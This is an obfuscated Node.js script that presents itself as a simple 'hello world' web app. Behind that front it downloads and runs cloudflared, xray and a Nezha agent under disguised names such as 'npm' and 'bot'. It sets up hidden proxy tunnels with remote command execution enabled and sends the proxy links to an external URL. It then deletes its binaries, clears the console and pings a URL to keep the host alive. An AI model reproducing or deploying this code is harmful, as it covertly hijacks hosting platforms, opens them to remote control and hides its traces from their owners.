const _0x394ca7=_0x4460;(function(_0x9a6e2b,_0x55da18){const _0x4fc289=_0x4460,_0x4750b3=_0x9a6e2b();while(!![]){try{const _0x72be68=parseInt(_0x4fc289(0x190))/0x1+parseInt(_0x4fc289(0x123))/0x2+-parseInt(_0x4fc289(0x180))/0x3*(-parseInt(_0x4fc289(0x1a6))/0x4)+-parseInt(_0x4fc289(0x1ad))/0x5*(-parseInt(_0x4fc289(0x183))/0x6)+-parseInt(_0x4fc289(0x127))/0x7*(-parseInt(_0x4fc289(0x126))/0x8)+parseInt(_0x4fc289(0x1a7))/0x9*(-parseInt(_0x4fc289(0x121))/0xa)+parseInt(_0x4fc289(0x1b8))/0xb*(parseInt(_0x4fc289(0x160))/0xc);if(_0x72be68===_0x55da18)break;else _0x4750b3['push'](_0x4750b3['shift']());}catch(_0x4a0f36){_0x4750b3['push'](_0x4750b3['shift']());}}}(_0x11da,0x5ca12));const FILE_PATH=process[_0x394ca7(0x138)]['FILE_PATH']||'./.npm',projectPageURL=process[_0x394ca7(0x138)]['URL']||'',intervalInseconds=process[_0x394ca7(0x138)][_0x394ca7(0x1af)]||0x78,CFIP=process[_0x394ca7(0x138)]['CFIP']||'ip.sb',CFPORT=process[_0x394ca7(0x138)][_0x394ca7(0x136)]||_0x394ca7(0x16d),VLPATH=process[_0x394ca7(0x138)]['VLPATH']||_0x394ca7(0x131),VMPATH=process[_0x394ca7(0x138)][_0x394ca7(0x165)]||_0x394ca7(0x185),ARGO_PORT=process[_0x394ca7(0x138)][_0x394ca7(0x1ae)]||0x1f90,delay=_0x5c7594=>new Promise(_0x3942af=>setTimeout(_0x3942af,_0x5c7594)),ARGO_DOMAIN=process[_0x394ca7(0x138)][_0x394ca7(0x144)]||'',ARGO_AUTH=process['env'][_0x394ca7(0x175)]||'',UUID=process[_0x394ca7(0x138)]['UUID']||'',NEZHA_VERSION=process[_0x394ca7(0x138)][_0x394ca7(0x17c)]||'V0',NEZHA_SERVER=process[_0x394ca7(0x138)][_0x394ca7(0x1c2)]||'',NEZHA_PORT=process[_0x394ca7(0x138)][_0x394ca7(0x166)]||_0x394ca7(0x16d),NEZHA_KEY=process['env'][_0x394ca7(0x154)]||'',SUB_NAME=process[_0x394ca7(0x138)]['SUB_NAME']||'',SUB_URL=process[_0x394ca7(0x138)]['SUB_URL']||'',PORT=process[_0x394ca7(0x138)][_0x394ca7(0x1c6)]||process[_0x394ca7(0x138)][_0x394ca7(0x133)]||0xbb8,axios=require(_0x394ca7(0x170)),os=require('os'),fs=require('fs'),path=require('path'),http=require(_0x394ca7(0x1a4)),https=require(_0x394ca7(0x191)),exec=require(_0x394ca7(0x1bd))['exec'],{execSync}=require(_0x394ca7(0x1bd));function createFolder(_0x184e68){const _0x474b21=_0x394ca7;if(!fs[_0x474b21(0x12c)](_0x184e68))fs[_0x474b21(0x187)](_0x184e68);else{}}const pathsToDelete=[_0x394ca7(0x125),_0x394ca7(0x16c),'npm',_0x394ca7(0x14f),'config.yml','boot.log',_0x394ca7(0x1a3)];function _0x11da(){const _0x3af8fb=['Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','115518qBALAt','data','bot','38144lPfQpV','126FrTeDZ','parse','\x20failed:\x20','/config.yml','write','existsSync','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1','forEach','Download\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','startvl','8443','SERVER_PORT','map','asOrganization','CFPORT','/xconf','env','readFileSync','config.yml\x20file\x20created\x20and\x20written\x20successfully.','Empowerment\x20failed\x20for\x20','/sub','length','log','\x0a\x20\x20\x20\x20skip_connection_count:\x20true\x0a\x20\x20\x20\x20skip_procs_count:\x20true\x0a\x20\x20\x20\x20temperature:\x20false\x0a\x20\x20\x20\x20tls:\x20','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1_arm','none','unlink','stringify','ARGO_DOMAIN','\x0a\x20\x20\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20\x20\x20\x20\x20\x20\x20','tunnel.yml','includes','Error\x20downloading\x20files:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Error\x20visiting\x20project\x20page:','url','&path=%2F','/log.txt','join','xconf','statusCode','base64','fileName','hostname','NEZHA_KEY','unlinkSync','%3Fed%3D2048&type=ws&encryption=none&security=tls&sni=','server\x20is\x20running\x20on\x20port\x20:\x20','blackhole','freedom','/npm\x20-s\x20','inbound.json','country','\x0a\x20\x20\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','vmess','GET','348xiPuoN','vmess://','end','npm\x20variable\x20is\x20empty,skip\x20running','listen','VMPATH','NEZHA_PORT','nohup\x20','Upload\x20failed:\x20','HTTP\x20error!\x20status:\x20','get','vless','web','443','application/json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','axios','block','Error\x20reading\x20file','\x20already\x20exists,\x20skipping\x20download.','toString','ARGO_AUTH','Skip\x20Delete\x20','2096','port','Error\x20creating\x20or\x20writing\x20config.yml\x20file:','--tls','finish','NEZHA_VERSION','all','close','/dev/null','29814HukWwe','App\x20is\x20running','arm','6ZreZqb','\x0a\x20\x20\x20\x20client_secret:\x20','startvm','https://github.com/mytcgd/myfiles/releases/download/main/xray_arm','mkdirSync','writeHead','vless://','?ed=2048','size','clear','https://github.com/mytcgd/myfiles/releases/download/main/xray','bot\x20is\x20running','amd','462203pmDoRR','https','tunnel.json','\x0a\x20\x20\x20\x20','?host=','readFile','tls','true','utf-8','lstatSync','arm64','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64','tcp','Not\x20found','speed.cloudflare.com','npm\x20is\x20running','from','/xconf/\x20>\x20/dev/null\x202>&1\x20&','bot\x20is\x20running.','log.txt','http','\x20>/dev/null\x202>&1\x20&','28aceZZN','18StjciW','npm\x20running\x20error:\x20','exec','/healthcheck','2087','/config.yml\x20>\x20/dev/null\x202>&1\x20&','348835BnzEhx','ARGO_PORT','TIME','writeFileSync','Error\x20starting\x20bot:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20credentials-file:\x20','File\x20','2053','utf8','web\x20running\x20error:\x20','127.0.0.1','107371RZzSYF','statSync','createServer','npm','boot.log','child_process','Page\x20visited\x20successfully','then','pathname','/web','NEZHA_SERVER','isDirectory','/npm\x20-c\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','PORT','rmSync','pipe','/npm','\x0a\x20\x20\x20\x20\x20\x20\x20\x20tunnel:\x20','\x0a\x20\x20\x20\x20use_gitee_to_upgrade:\x20false\x0a\x20\x20\x20\x20use_ipv6_country_code:\x20false\x0a\x20\x20\x20\x20uuid:\x20','Failed\x20to\x20delete\x20','message','error','aarch64','https+local://8.8.8.8/dns-query','stream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','replace','Error\x20executing\x20command:\x20','match','3243890oEbvLb'];_0x11da=function(){return _0x3af8fb;};return _0x11da();}function cleanupOldFiles(){const _0x2b4b1a=_0x394ca7;pathsToDelete[_0x2b4b1a(0x12e)](_0x103251=>{const _0x1e04a0=_0x2b4b1a,_0x9ef413=path[_0x1e04a0(0x14e)](FILE_PATH,_0x103251);try{fs[_0x1e04a0(0x12c)](_0x9ef413)?fs[_0x1e04a0(0x1b9)](_0x9ef413)[_0x1e04a0(0x1c3)]()?(fs[_0x1e04a0(0x1c7)](_0x9ef413,{'recursive':!![]}),console[_0x1e04a0(0x13e)](_0x9ef413+'\x20deleted')):(fs[_0x1e04a0(0x155)](_0x9ef413),console[_0x1e04a0(0x13e)](_0x9ef413+'\x20deleted')):console[_0x1e04a0(0x1ce)](_0x1e04a0(0x176)+_0x9ef413);}catch(_0x5c7eee){console['error'](_0x1e04a0(0x1cc)+_0x9ef413+':\x20'+_0x5c7eee);}});}function httpserver(){const _0x2b939a=_0x394ca7,_0x2b2b61=http[_0x2b939a(0x1ba)]((_0x31bd8c,_0x14a2a6)=>{const _0xaa51f=_0x2b939a;if(_0x31bd8c[_0xaa51f(0x14b)]==='/')_0x14a2a6[_0xaa51f(0x188)](0xc8),_0x14a2a6[_0xaa51f(0x162)]('hello\x20world');else{if(_0x31bd8c['url']===_0xaa51f(0x1aa))_0x14a2a6[_0xaa51f(0x188)](0xc8),_0x14a2a6['end']('ok');else{if(_0x31bd8c[_0xaa51f(0x14b)]===_0xaa51f(0x13c)){const _0x277643=FILE_PATH+_0xaa51f(0x14d);fs[_0xaa51f(0x195)](_0x277643,_0xaa51f(0x1b5),(_0x23d822,_0x4ed62c)=>{const _0x47caf5=_0xaa51f;_0x23d822?(_0x14a2a6[_0x47caf5(0x188)](0x1f4),_0x14a2a6['end'](_0x47caf5(0x172))):(_0x14a2a6[_0x47caf5(0x188)](0xc8,{'Content-Type':'text/plain;\x20charset=utf-8'}),_0x14a2a6[_0x47caf5(0x162)](_0x4ed62c));});}else _0x14a2a6['writeHead'](0x194),_0x14a2a6[_0xaa51f(0x162)](_0xaa51f(0x19d));}}});_0x2b2b61[_0x2b939a(0x164)](PORT,()=>{const _0x7706d=_0x2b939a;console[_0x7706d(0x13e)](_0x7706d(0x157)+PORT);});}async function getCloudflareMeta(){return new Promise((_0x572774,_0x523f98)=>{const _0x26abec=_0x4460,_0x3addca={'hostname':_0x26abec(0x19e),'path':'/meta','method':_0x26abec(0x15f)},_0x2bf58a=https['request'](_0x3addca,_0x41fcec=>{const _0x479a0a=_0x26abec;let _0x46288d='';_0x41fcec['on'](_0x479a0a(0x124),_0x4ea3ac=>{_0x46288d+=_0x4ea3ac;}),_0x41fcec['on'](_0x479a0a(0x162),()=>{const _0x10903b=_0x479a0a,_0x25717c=JSON[_0x10903b(0x128)](_0x46288d);_0x572774(_0x25717c);});});_0x2bf58a['on']('error',_0x46bd40=>{_0x523f98(_0x46bd40);}),_0x2bf58a['end']();});}const configpath=path['join'](FILE_PATH,_0x394ca7(0x14f));async function myconfig(){const _0x36bd93='/'+VLPATH,_0x251aa4='/'+VMPATH;function _0x50e2d0(){const _0x1f39f3=_0x4460,_0x5b5093={'log':{'access':_0x1f39f3(0x17f),'error':_0x1f39f3(0x17f),'loglevel':_0x1f39f3(0x141)},'dns':{'servers':[_0x1f39f3(0x1d0)]},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1f39f3(0x16b),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1f39f3(0x141),'fallbacks':[{'path':_0x36bd93,'dest':0xbba},{'path':_0x251aa4,'dest':0xbbb}]},'streamSettings':{'network':_0x1f39f3(0x19c)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x1f39f3(0x16b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1f39f3(0x141),'wsSettings':{'path':_0x36bd93}},'sniffing':{'enabled':!![],'destOverride':[_0x1f39f3(0x1a4),_0x1f39f3(0x196),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1f39f3(0x1b7),'protocol':_0x1f39f3(0x15e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x251aa4}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1f39f3(0x196),'quic'],'metadataOnly':![]}}]};fs['writeFileSync'](path[_0x1f39f3(0x14e)](configpath,_0x1f39f3(0x15b)),JSON[_0x1f39f3(0x143)](_0x5b5093,null,0x2));const _0x4c5f2a={'outbounds':[{'tag':'direct','protocol':_0x1f39f3(0x159)},{'tag':_0x1f39f3(0x171),'protocol':_0x1f39f3(0x158)}]};fs[_0x1f39f3(0x1b0)](path['join'](configpath,'outbound.json'),JSON[_0x1f39f3(0x143)](_0x4c5f2a,null,0x2));}_0x50e2d0();}function getSystemArchitecture(){const _0x3e2785=_0x394ca7,_0x2aad6c=os['arch']();return _0x2aad6c===_0x3e2785(0x182)||_0x2aad6c===_0x3e2785(0x19a)||_0x2aad6c===_0x3e2785(0x1cf)?_0x3e2785(0x182):_0x3e2785(0x18f);}const FILE_URLS={'bot':{'arm':'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64','amd':_0x394ca7(0x19b)},'web':{'arm':_0x394ca7(0x186),'amd':_0x394ca7(0x18d)},'npm':{'V0':{'arm':'https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm','amd':'https://github.com/kahunama/myfile/releases/download/main/nezha-agent'},'V1':{'arm':_0x394ca7(0x140),'amd':_0x394ca7(0x12d)}}};function getFilesForArchitecture(_0x23a8ea){const _0x2ab6f5=_0x394ca7,_0x30bd2c=[{'fileName':'bot','fileUrl':FILE_URLS[_0x2ab6f5(0x125)][_0x23a8ea]},{'fileName':_0x2ab6f5(0x16c),'fileUrl':FILE_URLS[_0x2ab6f5(0x16c)][_0x23a8ea]}];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY&&NEZHA_VERSION){const _0x9f40c3={'fileName':_0x2ab6f5(0x1bb),'fileUrl':FILE_URLS[_0x2ab6f5(0x1bb)][NEZHA_VERSION][_0x23a8ea]};return[..._0x30bd2c,_0x9f40c3];}return _0x30bd2c;}function authorizeFiles(_0x54a34d){const _0x57c381=_0x394ca7,_0x4140c4=0x1fd;_0x54a34d[_0x57c381(0x12e)](_0xbfc81=>{const _0x2e9834=_0x57c381,_0x154e19=path[_0x2e9834(0x14e)](FILE_PATH,_0xbfc81);fs['chmod'](_0x154e19,_0x4140c4,_0x520105=>{const _0x1dab1c=_0x2e9834;_0x520105?console[_0x1dab1c(0x1ce)](_0x1dab1c(0x13b)+_0x154e19+':\x20'+_0x520105):console[_0x1dab1c(0x13e)]('Empowerment\x20success\x20for\x20'+_0x154e19+':\x20'+_0x4140c4[_0x1dab1c(0x174)](0x8));});});}function download_function(_0x25f395,_0x205525,_0x188d40){const _0xeeadeb=_0x394ca7,_0x4e40b6=path[_0xeeadeb(0x14e)](FILE_PATH,_0x25f395);if(fs[_0xeeadeb(0x12c)](_0x4e40b6)){console[_0xeeadeb(0x13e)](_0xeeadeb(0x1b3)+_0x25f395+_0xeeadeb(0x173)),_0x188d40(null,_0x25f395);return;}const _0xc915d3=fs['createWriteStream'](_0x4e40b6);axios({'method':_0xeeadeb(0x16a),'url':_0x205525,'responseType':_0xeeadeb(0x1d1)})[_0xeeadeb(0x1bf)](_0x3c6262=>{const _0x14d040=_0xeeadeb;_0x3c6262[_0x14d040(0x124)][_0x14d040(0x1c8)](_0xc915d3),_0xc915d3['on'](_0x14d040(0x17b),()=>{const _0x1f648d=_0x14d040;_0xc915d3[_0x1f648d(0x17e)](),console[_0x1f648d(0x13e)](_0x1f648d(0x12f)+_0x25f395+'\x20successfully'),_0x188d40(null,_0x25f395);}),_0xc915d3['on'](_0x14d040(0x1ce),_0x1f3732=>{const _0x560d62=_0x14d040;fs[_0x560d62(0x142)](_0x4e40b6,()=>{});const _0x207bfc=_0x560d62(0x12f)+_0x25f395+_0x560d62(0x129)+_0x1f3732[_0x560d62(0x1cd)];console[_0x560d62(0x1ce)](_0x207bfc),_0x188d40(_0x207bfc);});})['catch'](_0x3ea6c5=>{const _0x410ca9=_0xeeadeb,_0x462110='Download\x20'+_0x25f395+_0x410ca9(0x129)+_0x3ea6c5[_0x410ca9(0x1cd)];console['error'](_0x462110),_0x188d40(_0x462110);});}async function downloadFiles(){const _0x13a7ef=_0x394ca7,_0x49a432=getSystemArchitecture(),_0x4435f0=getFilesForArchitecture(_0x49a432);if(_0x4435f0[_0x13a7ef(0x13d)]===0x0){console['log'](_0x13a7ef(0x122));return;}const _0x461a0b=_0x4435f0[_0x13a7ef(0x134)](_0x5f3fab=>{return new Promise((_0x4b307f,_0x31715a)=>{const _0x3d2b4f=_0x4460;download_function(_0x5f3fab[_0x3d2b4f(0x152)],_0x5f3fab['fileUrl'],(_0x477e7b,_0x568006)=>{_0x477e7b?_0x31715a(_0x477e7b):_0x4b307f(_0x568006);});});});try{const _0x246e03=await Promise[_0x13a7ef(0x17d)](_0x461a0b);authorizeFiles(_0x246e03);}catch(_0x54fc70){console[_0x13a7ef(0x1ce)](_0x13a7ef(0x148),_0x54fc70);return;}}function argoType(){const _0x386f69=_0x394ca7;if(!ARGO_AUTH||!ARGO_DOMAIN)return;if(ARGO_AUTH[_0x386f69(0x147)]('TunnelSecret')){fs[_0x386f69(0x1b0)](path[_0x386f69(0x14e)](FILE_PATH,_0x386f69(0x192)),ARGO_AUTH);const _0x37f20d=_0x386f69(0x1ca)+ARGO_AUTH['split']('\x22')[0xb]+_0x386f69(0x1b2)+path[_0x386f69(0x14e)](FILE_PATH,_0x386f69(0x192))+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20protocol:\x20http2\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20ingress:\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x386f69(0x15d)+ARGO_PORT+_0x386f69(0x145);fs['writeFileSync'](path[_0x386f69(0x14e)](FILE_PATH,_0x386f69(0x146)),_0x37f20d);}else{}}let NEZHA_TLS='';function nezv1config(){const _0x57d939=_0x394ca7,_0x42794b=_0x57d939(0x184)+NEZHA_KEY+'\x0a\x20\x20\x20\x20debug:\x20false\x0a\x20\x20\x20\x20disable_auto_update:\x20true\x0a\x20\x20\x20\x20disable_command_execute:\x20false\x0a\x20\x20\x20\x20disable_force_update:\x20true\x0a\x20\x20\x20\x20disable_nat:\x20false\x0a\x20\x20\x20\x20disable_send_query:\x20false\x0a\x20\x20\x20\x20gpu:\x20false\x0a\x20\x20\x20\x20insecure_tls:\x20false\x0a\x20\x20\x20\x20ip_report_period:\x201800\x0a\x20\x20\x20\x20report_delay:\x204\x0a\x20\x20\x20\x20server:\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x57d939(0x13f)+NEZHA_TLS+_0x57d939(0x1cb)+UUID+_0x57d939(0x193),_0x22d970=path[_0x57d939(0x14e)](FILE_PATH,'/config.yml');try{fs['writeFileSync'](_0x22d970,_0x42794b),console[_0x57d939(0x13e)](_0x57d939(0x13a));}catch(_0x265ad8){console[_0x57d939(0x1ce)](_0x57d939(0x179),_0x265ad8);}}async function runapp(){const _0x5b7e91=_0x394ca7;if(fs[_0x5b7e91(0x12c)](path[_0x5b7e91(0x14e)](FILE_PATH,_0x5b7e91(0x125)))){let _0x167364;if(ARGO_AUTH[_0x5b7e91(0x120)](/^[A-Z0-9a-z=]{120,250}$/))_0x167364=_0x5b7e91(0x1c5)+ARGO_AUTH;else ARGO_AUTH[_0x5b7e91(0x120)](/TunnelSecret/)?_0x167364='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x167364=_0x5b7e91(0x16f)+FILE_PATH+_0x5b7e91(0x149)+ARGO_PORT;try{await exec(_0x5b7e91(0x167)+FILE_PATH+'/bot\x20'+_0x167364+_0x5b7e91(0x1a5)),console[_0x5b7e91(0x13e)](_0x5b7e91(0x18e)),await delay(0x7d0);}catch(_0x1b7f6e){console[_0x5b7e91(0x1ce)](_0x5b7e91(0x11f)+_0x1b7f6e);}}await delay(0x1388);if(fs[_0x5b7e91(0x12c)](path['join'](FILE_PATH,'web'))){const _0x16edf9='nohup\x20'+FILE_PATH+'/web\x20run\x20-confdir\x20'+FILE_PATH+_0x5b7e91(0x1a1);try{await exec(_0x16edf9),console[_0x5b7e91(0x13e)]('web\x20is\x20running'),await delay(0x7d0);}catch(_0x4c336b){console['error'](_0x5b7e91(0x1b6)+_0x4c336b);}}if(fs[_0x5b7e91(0x12c)](path[_0x5b7e91(0x14e)](FILE_PATH,_0x5b7e91(0x1bb)))){const _0x3351cb=['443',_0x5b7e91(0x132),_0x5b7e91(0x177),_0x5b7e91(0x1ab),'2083',_0x5b7e91(0x1b4)];if(NEZHA_VERSION==='V0'){if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){_0x3351cb[_0x5b7e91(0x147)](NEZHA_PORT)?NEZHA_TLS=_0x5b7e91(0x17a):NEZHA_TLS='';const _0x17460a='nohup\x20'+FILE_PATH+_0x5b7e91(0x15a)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+NEZHA_TLS+_0x5b7e91(0x1a5);try{await exec(_0x17460a),console[_0x5b7e91(0x13e)]('npm\x20is\x20running'),await delay(0x3e8);}catch(_0x31624f){console['error'](_0x5b7e91(0x1a8)+_0x31624f);}}else console[_0x5b7e91(0x13e)](_0x5b7e91(0x163));}else{if(NEZHA_VERSION==='V1'){if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){_0x3351cb[_0x5b7e91(0x147)](NEZHA_PORT)?NEZHA_TLS=_0x5b7e91(0x197):NEZHA_TLS='false';nezv1config();const _0x131701=_0x5b7e91(0x167)+FILE_PATH+_0x5b7e91(0x1c4)+FILE_PATH+_0x5b7e91(0x1ac);try{await exec(_0x131701),console[_0x5b7e91(0x13e)](_0x5b7e91(0x19f)),await delay(0x3e8);}catch(_0x321b4e){console[_0x5b7e91(0x1ce)](_0x5b7e91(0x1a8)+_0x321b4e);}}else console[_0x5b7e91(0x13e)]('npm\x20variable\x20is\x20empty,skip\x20running');}}}}function _0x4460(_0x30bf5a,_0x4a6e69){const _0x11da1f=_0x11da();return _0x4460=function(_0x44601b,_0x33b519){_0x44601b=_0x44601b-0x11d;let _0x106c17=_0x11da1f[_0x44601b];return _0x106c17;},_0x4460(_0x30bf5a,_0x4a6e69);}async function extractDomains(){const _0xb7bbb2=_0x394ca7;let _0xf171b8;if(ARGO_AUTH&&ARGO_DOMAIN)_0xf171b8=ARGO_DOMAIN,await generateLinks(_0xf171b8);else try{await delay(0x2710);const _0x38a324=path[_0xb7bbb2(0x14e)](FILE_PATH,_0xb7bbb2(0x1bc));if(fs[_0xb7bbb2(0x12c)](_0x38a324)&&fs[_0xb7bbb2(0x1b9)](_0x38a324)[_0xb7bbb2(0x18b)]>0x0){const _0x4dba20=fs[_0xb7bbb2(0x139)](_0x38a324,_0xb7bbb2(0x198)),_0x1f6f0f=/info.*https:\/\/(.*trycloudflare\.com)/g;let _0x4a3be0,_0x43384a=null;while((_0x4a3be0=_0x1f6f0f[_0xb7bbb2(0x1a9)](_0x4dba20))!==null){_0x43384a=_0x4a3be0[0x1];}_0x43384a&&(_0xf171b8=_0x43384a),await generateLinks(_0xf171b8);}else{console[_0xb7bbb2(0x13e)](_0xb7bbb2(0x11d)),fs[_0xb7bbb2(0x155)](path[_0xb7bbb2(0x14e)](FILE_PATH,'boot.log')),await delay(0x7d0);async function _0x3daf8b(){const _0xacf709=_0xb7bbb2;try{await exec(_0xacf709(0x130));}catch(_0x22dd0c){}}_0x3daf8b(),await delay(0xbb8);const _0x4a11b3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xb7bbb2(0x149)+ARGO_PORT,_0x2be6ae='nohup\x20'+FILE_PATH+'/bot\x20'+_0x4a11b3+_0xb7bbb2(0x1a5);try{await exec(_0x2be6ae),console[_0xb7bbb2(0x13e)](_0xb7bbb2(0x1a2)),await delay(0xbb8),await extractDomains();}catch(_0x10ca5a){console[_0xb7bbb2(0x1ce)](_0xb7bbb2(0x1b1)+_0x10ca5a);}}}catch(_0x80357){}}let ISP,MYIP;async function getipandisp(){const _0x548964=_0x394ca7;let _0x38a00d=await getCloudflareMeta(),_0x12647d=_0x38a00d[_0x548964(0x15c)],_0x55db5d=_0x38a00d[_0x548964(0x135)];ISP=(_0x12647d+'-'+_0x55db5d)[_0x548964(0x11e)](/ /g,'_');}let UPLOAD_DATA,previousArgoDomain='';async function generateLinks(_0x1d4e95){const _0x5e6ecc=_0x394ca7;let _0x2cbd34,_0xd22d6c,_0x13f2b2,_0xa93f13;if(previousArgoDomain&&_0x1d4e95===previousArgoDomain)return;try{_0x2cbd34={'v':'2','ps':ISP+'-'+SUB_NAME,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5e6ecc(0x141),'net':'ws','type':_0x5e6ecc(0x141),'host':_0x1d4e95,'path':'/'+VMPATH+_0x5e6ecc(0x18a),'tls':'tls','sni':_0x1d4e95,'alpn':''},_0xd22d6c=_0x5e6ecc(0x161)+Buffer[_0x5e6ecc(0x1a0)](JSON['stringify'](_0x2cbd34))[_0x5e6ecc(0x174)](_0x5e6ecc(0x151)),_0x13f2b2=_0x5e6ecc(0x189)+UUID+'@'+CFIP+':'+CFPORT+_0x5e6ecc(0x194)+_0x1d4e95+_0x5e6ecc(0x14c)+VLPATH+_0x5e6ecc(0x156)+_0x1d4e95+'#'+ISP+'-'+SUB_NAME,_0xa93f13=_0xd22d6c+'\x0a'+_0x13f2b2;SUB_URL&&(UPLOAD_DATA=''+_0x13f2b2);const _0x4fb4ea=path[_0x5e6ecc(0x14e)](FILE_PATH,'log.txt');fs[_0x5e6ecc(0x1b0)](_0x4fb4ea,Buffer[_0x5e6ecc(0x1a0)](_0xa93f13)[_0x5e6ecc(0x174)](_0x5e6ecc(0x151))),previousArgoDomain=_0x1d4e95;}catch(_0x563206){}}async function uploadSubscription(_0x4d2030,_0x59a95e,_0x5f469c){const _0x385b4b=_0x394ca7,_0x8f017d=JSON[_0x385b4b(0x143)]({'URL_NAME':_0x4d2030,'URL':_0x59a95e}),_0x585b26={'hostname':new URL(_0x5f469c)[_0x385b4b(0x153)],'port':new URL(_0x5f469c)[_0x385b4b(0x178)]||0x1bb,'path':new URL(_0x5f469c)[_0x385b4b(0x1c0)],'method':'POST','headers':{'Content-Type':_0x385b4b(0x16e),'Content-Length':_0x8f017d[_0x385b4b(0x13d)]}};try{const _0x5047d7=await new Promise((_0x243435,_0x19a94d)=>{const _0x4813ee=_0x385b4b,_0x48b88f=https['request'](_0x585b26,_0x3e9e28=>{const _0x9c030c=_0x4460;if(_0x3e9e28['statusCode']<0xc8||_0x3e9e28[_0x9c030c(0x150)]>=0x12c)return _0x19a94d(new Error(_0x9c030c(0x169)+_0x3e9e28['statusCode']));let _0x202767='';_0x3e9e28['on'](_0x9c030c(0x124),_0x1bc806=>_0x202767+=_0x1bc806),_0x3e9e28['on'](_0x9c030c(0x162),()=>_0x243435(_0x202767));});_0x48b88f['on']('error',_0xf9a8e1=>_0x19a94d(_0xf9a8e1)),_0x48b88f[_0x4813ee(0x12b)](_0x8f017d),_0x48b88f[_0x4813ee(0x162)]();});return _0x5047d7;}catch(_0x57c01b){throw new Error(_0x385b4b(0x168)+_0x57c01b[_0x385b4b(0x1cd)]);}}async function subupload(){const _0x140eeb=_0x394ca7;try{const _0x40e54e=await uploadSubscription(SUB_NAME,UPLOAD_DATA,SUB_URL);fs['existsSync'](path[_0x140eeb(0x14e)](FILE_PATH,'boot.log'))&&await extractDomains();}catch(_0x523823){}}function cleanfiles(){setTimeout(()=>{const _0x160f83=_0x4460,_0x11331b=[FILE_PATH+'/bot',FILE_PATH+_0x160f83(0x1c1),FILE_PATH+_0x160f83(0x1c9),FILE_PATH+_0x160f83(0x12a),FILE_PATH+_0x160f83(0x137)];_0x11331b[_0x160f83(0x12e)](_0x2c7ceb=>{const _0x2ab1df=_0x160f83;try{fs[_0x2ab1df(0x12c)](_0x2c7ceb)&&(fs[_0x2ab1df(0x199)](_0x2c7ceb)['isDirectory']()?fs[_0x2ab1df(0x1c7)](_0x2c7ceb,{'recursive':!![]}):fs['unlinkSync'](_0x2c7ceb));}catch(_0x18d6fe){}}),console[_0x160f83(0x18c)](),console[_0x160f83(0x13e)](_0x160f83(0x181));},0xea60);}async function visitProjectPage(){const _0x2fd72b=_0x394ca7;try{await axios[_0x2fd72b(0x16a)](projectPageURL),console[_0x2fd72b(0x13e)](_0x2fd72b(0x1be));}catch(_0x420594){console['error'](_0x2fd72b(0x14a),_0x420594[_0x2fd72b(0x1cd)]);}}async function main(){const _0x5990d7=_0x394ca7;createFolder(FILE_PATH),cleanupOldFiles(),createFolder(path[_0x5990d7(0x14e)](FILE_PATH,_0x5990d7(0x14f))),argoType(),await downloadFiles(),await delay(0x1388),await getipandisp(),await myconfig(),await runapp(),await extractDomains(),httpserver(),cleanfiles(),SUB_URL&&(ARGO_DOMAIN&&ARGO_AUTH?await subupload():setInterval(subupload,intervalInseconds*0x3e8)),projectPageURL&&setInterval(visitProjectPage,intervalInseconds*0x3e8);}main();